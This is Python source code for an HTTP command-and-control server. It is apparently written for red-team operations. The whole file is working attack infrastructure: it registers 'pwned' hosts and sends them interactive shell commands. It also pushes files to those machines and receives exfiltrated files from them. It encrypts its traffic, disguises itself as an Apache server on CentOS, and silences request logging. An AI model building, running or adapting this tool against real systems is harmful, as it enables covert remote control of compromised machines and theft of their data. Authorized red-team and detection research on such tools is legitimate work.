# Command and Control server code

from http import server
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import unquote_plus
from inputimeout import inputimeout, TimeoutOccurred
from encryption import cipher
from settings import FILE_REQUEST, CWD_RESPONSE, FILE_SEND, PORT, CMD_REQUEST, INPUT_TIMEOUT, KEEP_ALIVE_CMD, RESPONSE, RESPONSE_KEY, BIND_ADDR, STORAGE

def get_new_session():
    """ Function to check if other sessions exist. If none do, re-initialize variables. However, if session do
    exist, allow the red team operator to pick one to become a new active session. """

    # These variables must be global as they will often be updated via multiple sessions
    global active_session, pwned_dict, pwned_id

    # Remove the dictionary entry for the current active session
    del pwned_dict[active_session]

    # If dictionary is empty, re-initialize variables to their starting values
    if not pwned_dict:
        print("Waiting for new connections.\n")
        pwned_id = 0
        active_session = 1
    else:
        # Display sessions in our dictionary and choose one of them to switch over to
        while True:
            print(*pwned_dict.items(), sep="\n")
            try:
                new_session = int(input("\nChoose a session number to make active: "))
            except ValueError:
                print("\nYou must choose a pwned id of one of the sessions shown on the screen\n")
                continue

            # Ensure we enter a pwned_id that is in our pwned_dict and set active_session to it
            if new_session in pwned_dict:
                active_session = new_session
                print(f"\nActive session is now: {pwned_dict[active_session]}")
                break

            else:
                print("You must choose a pwned id of one of the sessions shown on the screen.\n")
                continue

class C2Handler(BaseHTTPRequestHandler):
    """This is a child class of the BaseHTTPRequestHandler class.
    It handles all HTTP requests that arrive at the c2 server."""

    # Make our c2 server look like an up-to-date Apache server on CentOS
    server_version = "Apache/2.4.58"
    sys_version = "(CentOS)"

    # noinspection PyPep8Naming
    def do_GET(self):
        """ This method handles all HTTP GET requests that
        arrive at the c2 server."""

        # These variables must be global as they will often be updated via multiple sessions
        global active_session, client_account, client_hostname, pwned_dict, pwned_id

        # Follow this code block when the compromised computer is requesting a command
        if self.path.startswith(CMD_REQUEST):

            # Split out the client account name
            client = self.path.split(CMD_REQUEST)[1]

            # Encode the client data because decrypt requires it, then decrypt, then decode
            client = cipher.decrypt(client.encode()).decode()

            # Split out the client account name
            client_account = client.split("@")[0]

            # Split out the client hostname name
            client_hostname = client.split("@")[1]

            # If the client is not in pwned_dict, add it to pwned_dict and increment pwned_id
            if client not in pwned_dict.values():

                # Sends the HTTP response code and header back to the client
                self.http_response(404)

                # Increment our pwned_id and add the client to pwned_dict using pwned_id as the key
                pwned_id += 1
                pwned_dict[pwned_id] = client

                print(f"{client_account}@{client_hostname} has been pwned!\n")

            # If the client is in pwned_dict, and it is also our active session:
            elif client == pwned_dict[active_session]:

                # If INPUT_TIMEOUT is set, run inputimeout instead of regular input
                if INPUT_TIMEOUT:

                    # Azure kills a waiting HTTP GET session after 4 minutes, so we must handle input with a timeout
                    try:
                        # Collect the command to run on the client; set Linux style promt as well
                        command = inputimeout(prompt=f"{client_account}@{client_hostname}:{cwd}$ ", timeout=INPUT_TIMEOUT)

                    # If timeout occurs on our input, do a simple command to trigger a new connection
                    except TimeoutOccurred:
                        command = KEEP_ALIVE_CMD

                # Collect the command to run on the client; set Linux style promt as well
                else:
                    # Collect the command to run on the client; set Linux style promt as well
                    command = input(f"{client_account}@{client_hostname}:{cwd}$ ")

                # Write the command back to the client as a response; must utf-8 encode and encrypt
                try:
                    self.http_response(200)
                    self.wfile.write(cipher.encrypt(command.encode()))

                # If an exception occurs, notify and remove the active session from the dictionary
                except BrokenPipeError:
                    print(f"{client_account}@{client_hostname} has disconnected!\n")
                    get_new_session()
                else:
                    # If we have just killed a client, try to get a new session to set active
                    if command.startswith("client kill"):
                        get_new_session()

            # The client is in pwned_dict, but it is not our active session:
            else:

                # Sends the HTTP response code and header back to the client
                self.http_response(404)

        # Follow this code block when the compromised computer is requesting a file
        elif self.path.startswith(FILE_REQUEST):

            # Split out the encrypted filepath from the HTTP GET request
            filepath = self.path.split(FILE_REQUEST)[1]

            # Encode the filepath becouse decrypt requires it, then decrypt, then decode
            filepath = cipher.decrypt(filepath.encode()).decode()

            # Read the requested file into memory and stream it back for client's GET response
            try:
                with open(f"{filepath}", "rb") as file_handle:
                    self.http_response(200)
                    self.wfile.write(cipher.encrypt(file_handle.read()))
            except (FileNotFoundError, OSError):
                print(f"{filepath} was not found on the c2 server.")
                self.http_response(404)

        # Nobody should ever be accessing to our c2 server using HTTP GET other than to the above paths
        else:
            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server using HTTP GET. Why?\n")

    # noinspection PyPep8Naming
    def do_POST(self):
        """ This method handles all HTTP POST requests that
        arrive at the c2 server."""

        # Follow this code block when the compromised computer is responding with data to be printed on the screen
        if self.path == RESPONSE:
            print(self.handle_post_data())

        # Follow this code block when the compromised computer is responding with its current working directory
        elif self.path == CWD_RESPONSE:
            global cwd
            cwd = self.handle_post_data()

        # Nobody should ever be posting to our c2 server other than to the above paths
        else:
            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server using HTTP POST. Why?\n")


    def do_PUT(self):
        """ This method handles all HTTP PUT requests that arrive at the c2 server. """

        # Follow this code block when the compromised computer is sending the server a file
        if self.path.startswith(FILE_SEND + "/"):
            self.http_response(200)

            # Split out the encrypted filename from the HTTP PUT request
            filename = self.path.split(FILE_SEND + "/")[1]

            print("filename before decryption", filename)

            # Encode the filename because decrypt requires it, then decrypt, then decode
            filename = cipher.decrypt(filename.encode()).decode()

            print("filename after decryption", filename)

            # This adds the file name to our storage path
            incoming_file = STORAGE + "/" + filename

            print(incoming_file)

            # We need the content length to properly read in the file
            file_length = int(self.headers["Content-Length"])

            # Zero byte files cant't be transferred in
            if file_length is None:
                print(f"{incoming_file} has no data. Abording transfer.")
            else:
                # Read the stream coming from our client. decrypt and write the file out to disk
                with open(incoming_file, "wb") as file_handle:
                    file_handle.write(cipher.decrypt(self.rfile.read(file_length)))

        # Nobody should ever be accessing to our c2 server using HTTP PUT
        else:
            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server using HTTP PUT. Why?\n")



    def handle_post_data(self):
        """ Function to handle post data from a client. """

        # Sends the HTTP response code and header back to the client
        self.http_response(200)

        # Get Content-Length value from HTTP Headers
        content_length = int(self.headers.get("Content-Length"))

        # Gather the client's data by reading in the HTTP POST data
        client_data = self.rfile.read(content_length)

        # UTF-8 decode the client's data
        client_data = client_data.decode()
    
        # Remove the HTTP POST variable and the equal sign from the client's data
        client_data = client_data.replace(f"{RESPONSE_KEY}=", "", 1)

        # HTML/URL decode the client's data and translate "+" to a space
        client_data = unquote_plus(client_data)

        # Encode the client data because decrypt requires it, then decrypt, then decode
        client_data = cipher.decrypt(client_data.encode()).decode()

        # Return the processed client's data
        return client_data

    def http_response(self, code: int):
        """ Function that sends the HTTP response code and headers back to the client."""
        self.send_response(code)
        self.end_headers()

    def log_request(self, code: int | str = "-", size: int | str = "-") -> None:
        """ Included this to override BaseHTTPRequestHandler's log_request method because it writes
        to the screen. Our dosen't log any successfuf connections; it just returns, which is whar we want. """
        return
        # return super().log_request(code, size)()

# This maps to the client that we have a promt for
active_session = 1

# This is the current working directory from the client belonging to the active session
cwd = "~"

# This is the account from the client belonging to the active session
client_account = ""

# This is the hostname from the client belonging to the active session
client_hostname = ""

# Used to uniquely count and track each client connecting in to the c2 server
pwned_id = 0

# Tracks all pwned clients; key = pwned_id and value is unique from each client (account@hostname@epoch time)
pwned_dict = {}

# Instantiate oour HTTPServer object
server = HTTPServer((BIND_ADDR, PORT), C2Handler)

# Run the server in an infinite loop
server.serve_forever()